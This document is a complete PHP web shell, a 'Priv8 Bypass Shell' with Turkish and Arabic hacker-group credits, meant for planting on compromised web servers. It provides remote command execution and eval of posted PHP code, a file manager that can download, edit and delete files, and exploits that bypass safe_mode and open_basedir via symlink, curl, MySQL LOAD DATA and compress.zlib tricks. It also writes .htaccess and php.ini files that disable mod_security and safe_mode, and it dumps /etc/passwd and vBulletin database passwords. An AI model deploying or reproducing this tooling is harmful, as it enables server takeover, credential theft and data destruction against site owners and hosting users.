<?php
/****************************************\
|* izleyici Server Yamultucu Shell - wWw.redsecurity.iblogger.org *|
|* Priv8 Bypass Shell coded by izocin             *|
\****************************************/

define( 'DS', DIRECTORY_SEPARATOR );

$ini_reconf = array(
	'display_errors' => '0',
	'disable_functions' => '',
	'file_uploads' => 'On',
	'max_execution_time' => '0',
	'memory_limit' => '1024M',
	'open_basedir' => '',
	'safe_mode' => 'Off',
	'sql.safe_mode' => 'Off',
	'upload_max_filesize' => '1024M',
);

foreach ($ini_reconf as $key => $value) {
	@ini_set($key, $value);
}

date_default_timezone_set('Asia/Ho_Chi_Minh');

function dectectos() {
	$curos = strtoupper(substr(PHP_OS, 0, 3));
	return $curos;
}

//File download
$fdownload=@$_GET['fdownload'];
if ($fdownload != "" ){
	if (file_exists($fdownload)) {
		header('Content-Description: File Transfer');
		header('Content-Type: application/octet-stream');
		header('Content-Disposition: attachment; filename='.basename($fdownload));
		header('Content-Transfer-Encoding: binary');
		header('Expires: 0');
		header('Cache-Control: must-revalidate, post-check=0, pre-check=0');
		header('Pragma: public');
		header('Content-Length: ' . filesize($fdownload));
		ob_clean();
		flush();
		readfile($fdownload);
		exit;
	}
}
//PHP Info
function info()
{ ?>
	<div align="center" id="phpinfo">
	<?php
	ob_start () ;
	phpinfo () ;
	$pinfo = ob_get_contents () ;
	ob_end_clean () ;

	// the name attribute "module_Zend Optimizer" of an anker-tag is not xhtml valide, so replace it with "module_Zend_Optimizer"
	echo ( str_replace ( "module_Zend Optimizer", "module_Zend_Optimizer", preg_replace ( '%^.*<body>(.*)</body>.*$%ms', '$1', $pinfo ) ) ) ;
	?>
	</div>
<?php
}


//File Manager
function fileman()
{

	function getmode($par) {
		if (strtoupper(substr(PHP_OS, 0, 3)) === 'WIN') {
			return 'N/A';
		} else {
			$perms = fileperms($par);
			if (($perms & 0xC000) == 0xC000) {
				// Socket
				$info = 's';
			} elseif (($perms & 0xA000) == 0xA000) {
				// Symbolic Link
				$info = 'l';
			} elseif (($perms & 0x8000) == 0x8000) {
				// Regular
				$info = '-';
			} elseif (($perms & 0x6000) == 0x6000) {
				// Block special
				$info = 'b';
			} elseif (($perms & 0x4000) == 0x4000) {
				// Directory
				$info = 'd';
			} elseif (($perms & 0x2000) == 0x2000) {
				// Character special
				$info = 'c';
			} elseif (($perms & 0x1000) == 0x1000) {
				// FIFO pipe
				$info = 'p';
			} else {
				// Unknown
				$info = 'u';
			}
			// Owner
			$info .= (($perms & 0x0100) ? 'r' : '-');
			$info .= (($perms & 0x0080) ? 'w' : '-');
			$info .= (($perms & 0x0040) ?
			(($perms & 0x0800) ? 's' : 'x' ) :
			(($perms & 0x0800) ? 'S' : '-'));
			// Group
			$info .= (($perms & 0x0020) ? 'r' : '-');
			$info .= (($perms & 0x0010) ? 'w' : '-');
			$info .= (($perms & 0x0008) ?
			(($perms & 0x0400) ? 's' : 'x' ) :
			(($perms & 0x0400) ? 'S' : '-'));
			// World
			$info .= (($perms & 0x0004) ? 'r' : '-');
			$info .= (($perms & 0x0002) ? 'w' : '-');
			$info .= (($perms & 0x0001) ?
			(($perms & 0x0200) ? 't' : 'x' ) :
			(($perms & 0x0200) ? 'T' : '-'));

			return $info;
		}
	}

	function getowner($par) {
		if(function_exists('posix_getpwuid')) {
			$owner = @posix_getpwuid(@fileowner($par));
			return $owner['name'];
		}
	}

	function getgroup($par) {
		if(function_exists('posix_getgrgid')) {
			$group = @posix_getgrgid(@filegroup($par));
			return $group['name'];
		}
	}

	function getsize($par) {
		return @round(@filesize($par));
	}

	function byteConvert(&$bytes){
		$b = (int)$bytes;
		$s = array('  B', 'KB', 'MB', 'GB', 'TB');
		if($b < 0){
			return "0 ".$s[0];
		}
		$con = 1024;
		$e = (int)(log($b,$con));
		return number_format($b/pow($con,$e),2,',','.').' '.$s[$e];
	}

	$dir = realpath($_GET['dir']).DS;
	$list = scandir($dir);

	echo '
	<div align="center"><br>
	<form action="" method="GET">
		<input type="hidden" name="id" value="fm">
		<input type="text" name="dir" size="80" value="',$dir,'" class="input">&nbsp;
		<input type="submit" class="button" value=" Dir ">
	</form>
	</div>
	<div align="center">
	<table border="0" width="80%" cellspacing="1" cellpadding="2">
		<tr>
			<td width="180"><b><font size="2"> File / Folder Name </font></b></td>
			<td width="30" align="center"><font color="#FFFF00" size="2"><b> Owner </b></font></td>
			<td width="30" align="center"><font color="#FFFF00" size="2"><b> Group </b></font></td>
			<td width="50" align="center"><font color="#FFFFFF" size="2"><b> &nbsp;&nbsp;&nbsp;Size </b></font></td>
			<td width="30" align="center"><font color="#008000" size="2"><b> Download </b></font></td>
			<td width="30" align="center"><font color="#FF9933" size="2"><b> Edit </b></font></td>
			<td width="30" align="center"><font color="#999999" size="2"><b> Chmod </b></font></td>
			<td width="30" align="center"><font color="#FF0000" size="2"><b> Delete </b></font></td>
			<td width="150" align="center"><font color="#0080FF" size="2"><b> Last Modifed </b></font></td>
		</tr>';

for($i=0; $i<count($list); $i++) {
	if(@is_dir($dir.$list[$i])) {

		echo '
		<tr>
			<td><a href="?id=fm&dir=',$dir.$list[$i],'"><font color="#DD8008" size="2">',$list[$i],'</font></a></td>
			<td align="center"><font color="#00CCFF" size="2">',getowner($dir.$list[$i]),'</font></td>
			<td align="center"><font color="#00CCFF" size="2">',getgroup($dir.$list[$i]),'</font></td>
			<td align="center"></td>
			<td align="center"></td>
			<td align="center"></td>
			<td align="center"><a href="?id=fm&fchmod=',$dir.$list[$i],'"><font color="#999999" size="2">',getmode($dir.$list[$i]),'</font></a></td>
			<td align="center"><a href="?id=fm&fdelete=',$dir.$list[$i],'"><font color="#FF0000" size="2"> Delete </font></a></td>
			<td align="center"><font color="#FF9933" size="2" alt="DD-MM-YY">'.date ("d-m-y  H:i  P", filemtime($dir.$list[$i])).'</font></td>
		</tr>';
	}
}

for($i=0; $i<count($list); $i++) {
	if(@is_file($dir.$list[$i])) {

		echo '
		<tr>
			<td><a href="?id=fedit&fedit=',$dir.$list[$i],'"><font color="#FFFFFF" size="2">',$list[$i],'</font></a></td>
			<td align="center"><font color="#00CCFF" size="2">',getowner($dir.$list[$i]),'</font></td>
			<td align="center"><font color="#00CCFF" size="2">',getgroup($dir.$list[$i]),'</font></td>
			<td align="right"><font color="#0080FF" size="2">',byteConvert(getsize($dir.$list[$i])),'</font></td>
			<td align="center">';
					if (@is_readable($dir.$list[$i])){
						echo '<a href="?id=fm&fdownload=',$dir.$list[$i],'"><font size="2" color="#008000"> Download </font></a>';
					} else {
						echo '<font size="1" color="#FF0000"><b>Unreadable</b></font>';
					}
			echo '</td>
			<td align="center">';
					if (@is_readable($dir.$list[$i])){
						echo '<a href="?id=fedit&fedit=',$dir.$list[$i],'"><font size="2" color="#FF9933"> Edit </font></a>';
					} else {
						echo '<font size="1" color="#FF0000"><b>Unreadable</b></font>';
					}
			echo '</td>
			<td align="center"><a href="?id=fm&fchmod=',$dir.$list[$i],'"><font color="#999999" size="2">',getmode($dir.$list[$i]),'</font></a></td>
			<td align="center"><a href="?id=fm&fdelete=',$dir.$list[$i],'"><font color="#FF0000" size="2"> Delete </font></a></td>
			<td align="center"><font color="#FF9933" size="2" alt="DD-MM-YY">'.date ("d-m-y  H:i  P", filemtime($dir.$list[$i])).'</font></td>
		</tr>';
	}
}


	echo '
		<tr>
			<td valign="top" colspan="8">&nbsp;</td>
		</tr>
		<tr>
			<td valign="top" colspan="8">
				<form action="" method="GET">
				<table align="left" width="100%">
					<tr>
						<td width="20%" class="td">File View / Edit:</td>
						<td width="80%">
							<input name="fedit" type="text" size="50" class="input" />&nbsp;
							<input type="hidden" name="id"  value="fedit">
							<input type="submit" value=" View / Edit " class="button" />
						</td>
					</tr>
				</table>
				</form>

				<form action="" method="GET">
				<table align="left" width="100%">
					<tr>
						<td width="20%" class="td">File Download:</td>
						<td width="80%">
						<input name="fdownload" type="text" size="50" class="input" />&nbsp;
						<input type="submit" value=" Download " class="button" />
						</td>
					</tr>
				</table>
				</form>

				<form method="GET" action="">
				<table align="left" width="100%">
					<tr>
						<td width="20%" class="td">Chmod:</td>
						<td width="80%">
						<input type="text" name="fchmod" size="50" class="input" />&nbsp;
						<input type="text" name="mode" size="3" class="input" />&nbsp;
						<input type="submit" value=" Change " class="button" />
						</td>
					</tr>
				</table>
				</form>

				<form enctype="multipart/form-data" action="" method="POST">
				<table align="left" width="100%">
					<tr>
						<td width="20%" class="td">File Upload:</td>
						<td width="80%">
						<input name="userfile" type="file" size="50" class="file" />&nbsp;
						<input type="hidden" name="MAX_FILE_SIZE" value="300000"  />
						<input type="hidden" name="Fupath"  value="',$dir,'" />
						<input type="submit" value=" Upload " class="button" />
						</td>
					</tr>
				</table>
				</form>

				</div>
			</td>
		</tr>
	</table>';
}


//Default
function def()
{
	$id=$_GET['id'];
	if (function_exists('posix_getpwuid') && function_exists('posix_geteuid')) {
		$euserinfo  = @posix_getpwuid(@posix_geteuid());
	}
	if (function_exists('posix_getgrgid') && function_exists('posix_getegid')) {
		$egroupinfo = @posix_getgrgid(@posix_getegid());
	}
	echo '
	<p align="center" style="padding-left:20px;">
	<img border="0" src="http://img143.imageshack.us/img143/4081/securemt9.png"></a><br>
	</p>
	<p align="left" style="padding-left:20px;">
	<font color="#DD8008" size="2"><b>OS : ',php_uname(),'
	<br>
	SERVER IP : <font color="#FF0000">',gethostbyname($_SERVER['SERVER_NAME']),'</font><br>
	SERVER NAME : <font color="#FF0000">',$_SERVER['SERVER_NAME'],'</font><br>
	SERVER SOFTWARE : <font color="#FF0000">',$_SERVER['SERVER_SOFTWARE'],'</font><br>
	SERVER ADMIN : <font color="#FF0000">',$_SERVER['SERVER_ADMIN'],'</font><br>
        PHP VERSiON : <font color="#FF0000">',$ephpv = @phpversion(),'</font><br>
	uid = ',$euserinfo['uid'],' ( ',$euserinfo['name'],' ) &nbsp;&nbsp;&nbsp;&nbsp; gid = ',$egroupinfo['gid'],' ( ',$egroupinfo['name'],' )<br>
	</b></font></p>';
}


//Web Command
function wcom ()
{
	$cmd=$_POST['cmd'];
	$result=ex("$cmd");
	echo '<center><br><h3> Run Command </h3></center>
	<center>
	<form method="POST" action="">
	<input type="hidden" name="id" value="cmd" />
	<input type="text" size="85" name="cmd" value="',$cmd,'" class="input" />&nbsp;
	<input type="submit" class="button" value=" Run " />
	</form><br>
	<textarea rows=20 cols=85 class="textarea">',$result,'</textarea><br><br>';
}


//PHP Eval
function eeval()
{
	$code=stripslashes($_POST['code']);
	echo '<center><br><h3> PHP Code Evaluating </h3></center>
	<center>
	<form method="POST" action="">
	<input type="hidden" name="id" value="eval">
	<textarea name ="code" rows="10" cols="85" class="textarea">',$code,'mkDIR("file:");
chdir("file:");
mkDIR("etc");
chdir("etc");
mkDIR("passwd");
chdir("..");
chdir("..");

$ch = curl_init();

curl_setopt($ch, CURLOPT_URL, "file:file:///etc/passwd");
curl_setopt($ch, CURLOPT_HEADER, 0);

curl_exec($ch);

curl_close($ch);</textarea><br><br>
	<input type="submit" value=" Evaluate PHP Code" class="button"><hr>
	</form>
	<textarea rows="10" cols="85" class="textarea">';
	eval($code);
	echo '</textarea><br><br>';
}


//5.2.11 5.3.0 symlink
function e529b()
{

?>
<?php
$mode="cp";//????????????.
if($_REQUEST['bypass']!=$mode)
{
   echo "<iframe src=cp width=100% height=100% frameborder=0></iframe> ";
exit;
}
?>
<?php
/*
PHP 5.2.11/5.3.0 symlink() open_basedir bypass 
by Maksymilian Arciemowicz http://securityreason.com/
cxib [ a.T] securityreason [ d0t] com

CHUJWAMWMUZG
*/

$fakedir="cx";
$fakedep=16;

$num=0; // offset of symlink.$num

if(!empty($_GET['file'])) $file=$_GET['file'];
else if(!empty($_POST['file'])) $file=$_POST['file'];
else $file="";

echo '<PRE><img
src="http://securityreason.com/gfx/logo.gif?cx5211.php"><P>This is exploit
from <a
href="http://securityreason.com/" title="Security Audit PHP">Security Audit
Lab - SecurityReason</a> labs.
Author : Maksymilian Arciemowicz
<p>Script for legal use only.
<p>PHP 5.2.11 5.3.0 symlink open_basedir bypass
<p>More: <a href="http://securityreason.com/">SecurityReason</a>
<p><form name="form"
 action="?id=529b&bypass=cp" method="post"><input type="text" name="file" size="50"
value="'.htmlspecialchars($file).'"><input type="submit" name="hym"
value="Create Symlink"></form>';

if(empty($file))
    exit;

if(!is_writable("."))
    die("not writable directory");

$level=0;

for($as=0;$as<$fakedep;$as++){
    if(!file_exists($fakedir))
        mkdir($fakedir);
    chdir($fakedir);
}

while(1<$as--) chdir("..");

$hardstyle = explode("/", $file);

for($a=0;$a<count($hardstyle);$a++){
    if(!empty($hardstyle[$a])){
        if(!file_exists($hardstyle[$a])) 
            mkdir($hardstyle[$a]);
        chdir($hardstyle[$a]);
        $as++;
    }
}
$as++;
while($as--)
    chdir("..");

@rmdir("fakesymlink");
@unlink("fakesymlink");

@symlink(str_repeat($fakedir."/",$fakedep),"fakesymlink");

// this loop will skip allready created symlinks.
while(1)
    if(true==(@symlink("fakesymlink/".str_repeat("../",$fakedep-1).$file,
"symlink".$num))) break;
    else $num++;

@unlink("fakesymlink");
mkdir("fakesymlink");

die('<FONT COLOR="RED">check symlink <a
href="./symlink'.$num.'">symlink'.$num.'</a> file</FONT>');

?> 
<?php

}


//Safe Modu Offla
function epriv8()
{

$kokdosya = ".htaccess";

$dosya_adi = "$kokdosya";
$dosya = fopen ($dosya_adi , 'w') or die ("Dosya açýlamadý!");
$metin = "<IfModule mod_security.c>
    SecFilterEngine Off
    SecFilterScanPOST Off
</IfModule>";	
fwrite ( $dosya , $metin ) ;
fclose ($dosya); 

$kokdosya = "php.ini";

$dosya_adi = "$kokdosya";
$dosya = fopen ($dosya_adi , 'w') or die ("Dosya açýlamadý!");
$metin = "safe_mode          =       OFF
disable_functions       =            NONE";	
fwrite ( $dosya , $metin ) ;
fclose ($dosya);


}


//Openbasedir Bypass
function eobypass()
{

?>	
<?
/*########################################### 
NameScrip : Php hacker v1.0
Private For Hack15 Members ..
Coder By GeNiUs HaCkEr - Team Hack15
Mails : Linux@Nesma.Net.Sa & Vv9@Hotmail.Com
WwW.Hack15.CoM       
###########################################*/
error_reporting(0); 
set_magic_quotes_runtime(0);
if(version_compare(phpversion(), '4.1.0') == -1)
 {$_POST   = &$HTTP_POST_VARS;$_GET    = &$HTTP_GET_VARS;
 $_SERVER = &$HTTP_SERVER_VARS;
 }function inclink($link,$val){$requ=$_SERVER["REQUEST_URI"];
if (strstr ($requ,$link)){return preg_replace("/$link=[\\d\\w\\W\\D\\S]*/","$link=$val",$requ);}elseif (strstr ($requ,"showsc")){return preg_replace("/showsc=[\\d\\w\\W\\D\\S]*/","$link=$val",$requ);}
elseif (strstr ($requ,"hlp")){return preg_replace("/hlp=[\\d\\w\\W\\D\\S]*/","$link=$val",$requ);}elseif (strstr($requ,"?")){return $requ."&".$link."=".$val;}
else{return $requ."?".$link."=".$val;}}
function delm($delmtxt){print"<center><table bgcolor=black style='border:1px solid #008080' width=99% height=2%>";print"<tr><td><b><center><font size=2 color=#008080>$delmtxt</td></tr></table></center>";}
function callfuncs($cmnd){if (function_exists(shell_exec)){$scmd=shell_exec($cmnd);
$nscmd=htmlspecialchars($scmd);print $nscmd;}
elseif(!function_exists(shell_exec)){exec($cmnd,$ecmd);
$ecmd = join("\n",$ecmd);$necmd=htmlspecialchars($ecmd);print $necmd;}
elseif(!function_exists(exec)){$pcmd = popen($cmnd,"r");
while (!feof($pcmd)){ $res = htmlspecialchars(fgetc($pcmd));;
print $res;}pclose($pcmd);}elseif(!function_exists(popen)){ 
ob_start();system($cmnd);$sret = ob_get_contents();ob_clean();print htmlspecialchars($sret);}elseif(!function_exists(system)){
ob_start();passthru($cmnd);$pret = ob_get_contents();ob_clean();
print htmlspecialchars($pret);}}
function input($type,$name,$value,$size)
{if (empty($value)){print "<input type=$type name=$name size=$size>";}
elseif(empty($name)&&empty($size)){print "<input type=$type value=$value >";}
elseif(empty($size)){print "<input type=$type name=$name value=$value >";}
else {print "<input type=$type name=$name value=$value size=$size >";}}
function permcol($path){if (is_writable($path)){print "<font color=#008080>";
callperms($path); print "</font>";}
elseif (!is_readable($path)&&!is_writable($path)){print "<font color=red>";
callperms($path); print "</font>";}
else {print "<font color=white>";callperms($path);}}
if ($dlink=="dwld"){download($_REQUEST['dwld']);}
function download($dwfile) {$size = filesize($dwfile);
@header("Content-Type: application/force-download;name=$dwfile");
@header("Content-Transfer-Encoding: binary");
@header("Content-Length: $size");
@header("Content-Disposition: attachment; filename=$dwfile");
@header("Expires: 0");
@header("Cache-Control: no-cache, must-revalidate");
@header("Pragma: no-cache");
@readfile($dwfile); exit;}
?>
<html> 
<head><title>Hack15Shell</title></head>
<style> 
BODY { SCROLLBAR-BASE-COLOR: #191919; SCROLLBAR-ARROW-COLOR: #008080; } 
a{color:#dadada;text-decoration:none;font-family:tahoma;font-size:13px}
a:hover{color:#008080}
input{FONT-WEIGHT:normal;background-color: #191919;font-size: 12px; color: #dadada; font-family: Tahoma; border: 1px solid #666666;height:17}
textarea{background-color:#191919;color:#dadada;font-weight:bold;font-size: 12px;font-family: Tahoma; border: 1 solid #666666;}
div{font-size:12px;font-family:tahoma;font-weight:normal;color:whitesmoke}
select{background-color: #191919; font-size: 12px; color: #dadada; font-family: Tahoma; border: 1 solid #666666;font-weight:bold;}</style> 
<body bgcolor=black text=white><font face="sans ms" size=3> 
</body> 
</html> 
<?
$nscdir =(!isset($_REQUEST['scdir']))?getcwd():chdir($_REQUEST['scdir']);$nscdir=getcwd();
$sf="<form method=post>";$ef="</form>";
$st="<table style=\"border:1px #dadada solid \" width=100% height=100%>";
$et="</table>";$c1="<tr><td height=22% style=\"border:1px #dadada solid \">";
$c2="<tr><td style=\"border:1px #dadada solid \">";$ec="</tr></td>";
$sta="<textarea cols=157 rows=23>";$eta="</textarea>";
$sfnt="<font face=tahoma size=2 color=#008080>";$efnt="</font>";
################# Editing By User ########################
///////////////////////////////
                             //
$mysql_use = "no"; //"yes"   //
$mhost = "localhost";        //
$muser = "root";             //
$mpass = "pass";             //
$mdb = "name";               //
$them = "xxx"; //any site    //
$you = "xx"; //your username //
$flib = "hack15.txt";        //
$folder = "hack15.txt";      //
///////////////////////////////
################# PhP Design (Start) ########################
delm(": Php Hacker v1.0 (Shell) :");
print"<table bgcolor=#191919 style=\"border:2px #dadada solid \" width=100% height=%>";print"<tr><td>"; print"<b><center><font face=tahoma color=white size=4>[ Php hacker v1.0 ]::[ Owned By Yourname ]
</font></b></center>"; print"</td></tr>";print"</table>";print "<br>";
print"<table bgcolor=#191919 style=\"border:2px #dadada solid \" width=100% height=%>";print"<tr><td>"; print"<center><div><b>";print "<a href=".inclink('linux', 'greet').">Gr33tz To</a>";
print " - <a href='javascript:history.back()'>Back</a>";
print "</td></tr></table>";
echo "<br>";
print "<table bgcolor=#2A2A2A style=\"border:2px solid black\" width=100%>"; 
if (@ini_get("safe_mode") or strtolower(@ini_get("safe_mode")) == "on")
{
 $safemode = true;
 $hsafemode = "<font color=\"red\">ON (secure)</font>";
}
else {$safemode = false; $hsafemode = "<font color=\"green\">OFF (not secure)</font>";}
echo("Safe-mode: $hsafemode");
print "</td></tr></table>";
echo "<br>";
################# PhP Hacked ########################
// read greet //
if ($linux=='greet')
{
echo "<textarea method='POST' cols='95' rows='30' wrar='off' >";
echo "GeNiUs HaCkEr & Blood Hacker & Mr.ALJoOoKeR & Dr_Whad_Drb & Saudi Hunter & Saudi Coder &  ROMANCY-HACKER & Qatil_Albasik & Caeser & KsA HaCkEr & Hacker Zero & Mr.Shares & Dr.Shares
";
  echo "</textarea>";
}
// read file unzend sorce //
if(empty($_POST['sorce'])){
} else {

}
// read file unzend functions //
 if(empty($_POST['func'])){
} else {
echo "<textarea method='POST' cols='95' rows='30' wrar='off' >";
$zeen=$_POST['func'];
require("$zeen");
echo "Database : ".$config['Database']['dbname']." <X> ";
echo "UserName : ".$config['MasterServer']['username']." <X> ";
echo "Password : ".$config['MasterServer']['password']." <X> ";
echo "</textarea></p>";
}// read file symlink ( ) //
if(empty($_POST['sym'])){
} else {
echo "<textarea method='POST' cols='95' rows='30' wrar='off' >";
$fp = fopen("hack15.txt","w+");
fwrite($fp,"Php Hacker Was Here");
@unlink($flib);
$sym = "/home/" . $them . "/public_html/" . $k;
$link = "/home/"  . $you . "/public_html/" . $folder . "/" . $flib;
@symlink($sym, $link);
if ($k{0} == "/") {
echo "<script> window.location = '" . $flib . "'</script>";
}else{
echo "<pre><xmp>";
echo readlink($flib) . "\n";
echo "Filesize: " . linkinfo($flib) . "B\n\n";
echo file_get_contents("http://" . $_SERVER['HTTP_HOST'] . "/"  . $folder . "/" . $flib);
  echo "</textarea>";
}
}

// read file plugin ( ) //
if(empty($_POST['plugin'])){
} else {
echo "<textarea method='POST' cols='95' rows='30' wrar='off' >";
for($uid=0;$uid<60000;$uid++){   //cat /etc/passwd
 $ara = posix_getpwuid($uid);
  if (!empty($ara)) {
       while (list ($key, $val) = each($ara)){
        print "$val:";
  }
  print "\n";
     }
  }
  echo "</textarea>";
}
// read file id ( ) //
if ($_POST['rid'] ){
echo "<textarea method='POST' cols='95' rows='30' wrar='off' >";
 for($uid=0;$uid<60000;$uid++){   //cat /etc/passwd
$ara = posix_getpwuid($uid);
 if (!empty($ara)) {
while (list ($key, $val) = each($ara)){
print "$val:";
}
 print "\n";
}
 }
echo "</textarea>";
break;

 }
// read file imap ( ) //
$string = !empty($_POST['rimap']) ? $_POST['rimap'] : 0;
if(empty($_POST['rimap'])){
} else {
echo "<textarea method='POST' cols='95' rows='30' wrar='off' >";
$stream = imap_open($string, "", "");
$str = imap_body($stream, 1);
echo "</textarea>";
}
// read file Curl ( ) //
if(empty($_POST['curl'])){
} else {
echo "<textarea method='POST' cols='95' rows='30' wrar='off' >";
$m=$_POST['curl'];
$ch =
curl_init("file:///".$m."\x00/../../../../../../../../../../../../".__FILE__);
curl_exec($ch);
var_dump(curl_exec($ch));
echo "</textarea>";
}

// read file SQL ( ) //
if(empty($_POST['ssql'])){
} else {
echo "<textarea method='POST' cols='95' rows='30' wrar='off' >";
$file=$_POST['ssql'];


$mysql_files_str = "/etc/passwd:/proc/cpuinfo:/etc/resolv.conf:/etc/proftpd.conf";
$mysql_files = explode(':', $mysql_files_str);

$sql = array (
"USE $mdb",
'CREATE TEMPORARY TABLE ' . ($tbl = 'A'.time ()) . ' (a LONGBLOB)',
"LOAD DATA LOCAL INFILE '$file' INTO TABLE $tbl FIELDS "
. "TERMINATED BY       '__THIS_NEVER_HAPPENS__' "
. "ESCAPED BY          '' "
. "LINES TERMINATED BY '__THIS_NEVER_HAPPENS__'",

"SELECT a FROM $tbl LIMIT 1"
);
mysql_connect ($mhost, $muser, $mpass);

foreach ($sql as $statement) {
   $q = mysql_query ($statement);

   if ($q == false) die (
      "FAILED: " . $statement . "\n" .
      "REASON: " . mysql_error () . "\n"
   );

   if (! $r = @mysql_fetch_array ($q, MYSQL_NUM)) continue;

   echo htmlspecialchars($r[0]);
   mysql_free_result ($q);
}
echo "</textarea>";
}



// read file copy & ini ( ) //
if (isset ($_REQUEST['safefile'])){
$file=$_REQUEST['safefile'];$tymczas="";if(empty($file)){
if(empty($_GET['file'])){if(empty($_POST['file'])){
print "<center>[ Please choose a file first to read it using copy() ]</center>";
} else {$file=$_POST['file'];}} else {$file=$_GET['file'];}}
$temp=tempnam($tymczas, "cx");if(copy("compress.zlib://".$file, $temp)){
$zrodlo = fopen($temp, "r");$tekst = fread($zrodlo, filesize($temp));
fclose($zrodlo);echo "<center><pre>".$sta.htmlspecialchars($tekst).$eta."</pre></center>";unlink($temp);} else {
print "<FONT COLOR=\"RED\"><CENTER>Sorry, Can't read the selected file !!
</CENTER></FONT><br>";}}if (isset ($_REQUEST['inifile'])){
ini_restore("safe_mode");ini_restore("open_basedir");
print "<center><pre>".$sta;
if (include(htmlspecialchars($_REQUEST['inifile']))){}else {print "Sorry, can't read the selected file !!";}print $eta."</pre></center>";}
delm(": Safe mode bypass :");
print "<table bgcolor=#2A2A2A style=\"border:2px solid black\" width=100%>";
print "<tr><td width=50%><div align=left>";
print $st.$c1."<div><b><center>Using copy() function</div>";
print $ec.$c2.$sf."&nbsp;";
input("text","safefile",$nscdir,75);
input("hidden","scdir",$nscdir,0);print " ";
input("submit","","Read-F","");print "</center>".$ec.$ef.$et;
print "</td><td height=20% width=50%><div align=right>";
print $st.$c1."<div><b><center>Using ini_restore() function</div>";
print $ec.$c2.$sf."&nbsp;";
input("text","inifile",$nscdir,75);
input("hidden","scdir",$nscdir,0);print " ";
input("submit","","Read-F","");print "</center>".$ec.$ef.$et;
print "</td></tr></table>";
print "<table bgcolor=#2A2A2A style=\"border:2px solid black\" width=100%>";
print "<tr><td width=50%><div align=left>";
print $st.$c1."<div><b><center>Using sql() function</div>";
print $ec.$c2.$sf."&nbsp;";
input("text","ssql",$nscdir,75);
input("hidden","scdir",$nscdir,0);print " ";
input("submit","","Read-F","");print "</center>".$ec.$ef.$et;
print "</td><td height=20% width=50%><div align=right>";
print $st.$c1."<div><b><center>Using Curl() function</div>";
print $ec.$c2.$sf."&nbsp;";
input("text","curl",$nscdir,75);
input("hidden","scdir",$nscdir,0);print " ";
input("submit","","Read-F","");print "</center>".$ec.$ef.$et;
print "</td></tr></table>";
print "<table bgcolor=#2A2A2A style=\"border:2px solid black\" width=100%>";
print "<tr><td width=50%><div align=left>";
print $st.$c1."<div><b><center>Using imap() function</div>";
print $ec.$c2.$sf."&nbsp;";
input("text","rimap",$nscdir,75);
input("hidden","scdir",$nscdir,0);print " ";
input("submit","","Read-F","");print "</center>".$ec.$ef.$et;
print "</td><td height=20% width=50%><div align=right>";
print $st.$c1."<div><b><center>Using id() function</div>";
print $ec.$c2.$sf."&nbsp;";
input("text","rid",$nscdir,75);
input("hidden","scdir",$nscdir,0);print " ";
input("submit","","Read-F","");print "</center>".$ec.$ef.$et;
print "</td></tr></table>";
print "<table bgcolor=#2A2A2A style=\"border:2px solid black\" width=100%>";
print "<tr><td width=50%><div align=left>";
print $st.$c1."<div><b><center>Using plugin() function</div>";
print $ec.$c2.$sf."&nbsp;";
input("text","plugin",$nscdir,75);
input("hidden","scdir",$nscdir,0);print " ";
input("submit","","Read-F","");print "</center>".$ec.$ef.$et;
print "</td><td height=20% width=50%><div align=right>";
print $st.$c1."<div><b><center>Using symlink() function</div>";
print $ec.$c2.$sf."&nbsp;";
input("text","sym",$nscdir,75);
input("hidden","scdir",$nscdir,0);print " ";
input("submit","","Read-F","");print "</center>".$ec.$ef.$et;
print "</td></tr></table>";
delm(": Unzend Config :");
print "<table bgcolor=#2A2A2A style=\"border:2px solid black\" width=100%>";
print "<tr><td width=50%><div align=left>";
print $st.$c1."<div><b><center>Connect To Functions Of Config</div>";
print $ec.$c2.$sf."&nbsp;";
input("text","func",$nscdir,75);
input("hidden","scdir",$nscdir,0);print " ";
input("submit","","Read-F","");print "</center>".$ec.$ef.$et;
print "</td></tr></table>";
?><?
print "<br><table bgcolor=#191919 style=\"border:2px #dadada solid \" width=100% height=%>"; 
print"<tr><td><font size=2 face=tahoma>"; 
print"<center>Coder By GeNiUs HaCkEr <br>[ Team Hack15 :: Go to : <a target='_blank' href='http://www.Hack15.com'>Http://Hack15.com</a> ]"; 
print"</font></td></tr></table>";
?>
<PHP

}


//Vbulletin config decoder
function edecode()
{

?>	
<?
/*================*\
|| ############### ||
|| # H-T oM[3]Ga # ||
|| ############### ||
\*================*/
?>
<title>ionCube & Zend Decoder</title>
<form name="form" action="?a=decode" method="post">
<tr><td><input name="file" value="config.php" /></td></tr>
<input type="submit" name="Connect" value="Decode" />
<br>
<?
$a = $_GET['a'];
if($a=='decode' && isset($_POST['file']))
{
$file = $_POST['file'];
include $file;
?>
<? echo $config['MasterServer']['servername']."\n"; ?><br>
<? echo $config['Database']['dbname']."\n"; ?><br>
<? echo $config['MasterServer']['username']."\n"; ?><br>
<? echo $config['MasterServer']['password']."\n"; ?><br>
<?
}
if ($a=='config')
{
}
?>
<?PHP

}


//Php 4 Back
function ephp4()
{
	@unlink('.htaccess');
$H = fopen('.htaccess','w+');
$Str = '<Files *.php>
   ForceType application/x-httpd-php4
</Files>';
if(fwrite($H,$Str)){
echo "[+] Evil File Created Succes ! \n";
}
fclose($H);
break;

}

//Php 4.x Bypass
function e444()
{

?>
<?
/*
www.securitywall.org 
Safe Mode Command Execution Shell
*/
function safeshell($komut) 
{ 
ini_restore("safe_mode");
ini_restore("open_basedir");
 $res = ''; 
 if (!empty($komut)) 
 { 
if(function_exists('exec')) 
{ 
 @exec($komut,$res); 
 $res = join("\n",$res); 
} 
elseif(function_exists('shell_exec')) 
{ 
 $res = @shell_exec($komut); 
} 
elseif(function_exists('system')) 
{ 
 @ob_start(); 
 @system($komut); 
 $res = @ob_get_contents(); 
 @ob_end_clean(); 
} 
elseif(function_exists('passthru')) 
{ 
 @ob_start(); 
 @passthru($komut); 
 $res = @ob_get_contents(); 
 @ob_end_clean(); 
} 
elseif(@is_resource($f = @popen($komut,"r"))) 
{ 
$res = ""; 
while(!@feof($f)) { $res .= @fread($f,1024); } 
@pclose($f); 
} 
 } 
 return $res; 
}
echo "<b><font color=blue>Safe Mode Command Execution Bypass Exploit</font></b><br>";
print_r('
<pre>
<form method="POST" action="">
<b><font color=blue>Komut :</font></b><input name="baba" type="text"><input value="Calistir" type="submit">
</form>
<form method="POST" action="">
<b><font color=blue>Hazir Komutlar :=) :</font><select size="1" name="liz0">
<option value="cat /etc/passwd">/etc/passwd</option>
<option value="netstat -an | grep -i listen">Tum Acikk Portalari Gor</option>
<option value="cat /var/cpanel/accounting.log">/var/cpanel/accounting.log</option>
